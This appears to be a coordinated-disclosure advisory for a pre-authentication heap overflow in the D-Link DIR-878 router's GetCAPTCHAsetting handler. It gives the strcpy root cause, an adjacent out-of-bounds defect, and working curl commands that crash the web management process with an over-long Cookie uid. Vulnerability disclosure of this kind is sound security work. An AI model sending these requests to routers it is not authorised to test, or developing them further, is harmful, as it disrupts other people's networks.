# D-Link DIR-878 GetCAPTCHAsetting Cookie uid Heap-based Buffer Overflow (Pre-authentication)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A heap-based buffer overflow vulnerability was discovered in D-Link DIR-878 (REV A) firmware
v1.20B05. The `GetCAPTCHAsetting` HNAP handler in `bin/prog.cgi` copies the attacker-controlled
`uid` value from the HTTP Cookie header into an 11-byte heap allocation (`malloc(0xb)`) using
`strcpy`, without any length check. `GetCAPTCHAsetting` serves the login page and is reachable
**without any authentication**. A remote, unauthenticated attacker in the adjacent network can
crash the web management process with an over-long `uid`; because the overflowed content and its
length are fully attacker-controlled, heap metadata corruption with further code-execution
potential must be assumed.

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS (announcement SAP10475); later v1.30B08
  hotfix builds share the same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: Heap-based Buffer Overflow — CWE-122 (out-of-bounds write, CWE-787)
- Component: `bin/prog.cgi` (HNAP/FastCGI main handler), handler function at 0x436158
  (`FUN_00436158`)

### Root Cause

When registering a new uid, the handler executes the equivalent of:

```c
char *p = malloc(0xb);          /* 11 bytes */
strcpy(p, uid_from_cookie);     /* no length check */
```

The `uid` value comes straight from the request's `Cookie: uid=...` header with no length
validation. Any `uid` of 11 bytes or more overflows the 11-byte heap chunk. This matches the
observed crash threshold exactly (see below).

### Ancillary defect in the same handler (documented, same root area)

The global uid→captcha map `gUidCaptMap` is grown with a fixed `realloc(0x50)` (80 bytes = room
for 10 entries) while the counter `gCntUid` increases monotonically: starting from the 11th
distinct uid, each new uid writes two pointers out of bounds. Eleven requests with distinct uid
values are sufficient; no authentication is required.

## Proof of Concept (non-destructive)

Baseline (short uid — control group):

```bash
curl -s -X POST http://<router>/HNAP1/ \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H 'Cookie: uid=baseline_ok' \
  -H 'Content-Type: text/xml' \
  --data-binary '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetCAPTCHAsetting xmlns="http://purenetworks.com/HNAP1/"></GetCAPTCHAsetting></soap:Body></soap:Envelope>'
# Observed: HTTP 200, <GetCAPTCHAsettingResult>OK</GetCAPTCHAsettingResult>
#           plus <CaptchaUrl>/docs/w2A33q69mr.jpg</CaptchaUrl>
```

Attack (uid = 512 × "E"):

```bash
curl -s -X POST http://<router>/HNAP1/ \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H "Cookie: uid=$(printf 'E%.0s' $(seq 512))" \
  -H 'Content-Type: text/xml' \
  --data-binary '<same body as above>'
# Observed: HTTP 500; lighttpd log: "child signaled: 11" (SIGSEGV),
#           "unexpected end-of-file (perhaps the fastcgi process died)".
#           The FastCGI worker is restarted automatically; subsequent requests succeed.
```

Length sweep (uid length vs. result), demonstrating the malloc(0xb) boundary:

| uid length | result |
|---|---|
| 8 | 200 OK |
| 11 | 500 (SIGSEGV) |
| 12 | 200 (heap-neighbor layout dependent) |
| 16 / 24 / 32 / 64 / 128 / 256 / 512 | 500 (SIGSEGV) |

The threshold at ~11 bytes coincides exactly with the `malloc(0xb)` allocation size. Occasional
non-crashes at specific lengths are consistent with the probabilistic nature of uClibc heap
corruption and do not affect the root-cause determination.

The PoC only crashes the FastCGI worker (which is automatically restarted); it writes nothing to
configuration or flash. **Cleanup:** none required; the service self-heals.

## Impact

- Attacker profile: unauthenticated, adjacent-network (LAN side; also WAN if remote management is
  enabled).
- Proven impact: pre-authentication crash of the web management handler (denial of service).
- Potential impact: the overflowed bytes are fully attacker-controlled (any bytes except `&` and
  `;`, arbitrary length), so uClibc heap metadata can be overwritten; code execution is plausible
  with further exploitation work but was **not** developed and is **not** claimed as proven.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5** (Medium)

Rationale: scored on the proven pre-authentication crash (DoS). The documented heap-corruption
control suggests a higher ceiling, but the score reflects observed evidence only.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering of the HNAP dispatch table
(147 actions mapped) plus dynamic differential testing in a qemu-user rehosting environment.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
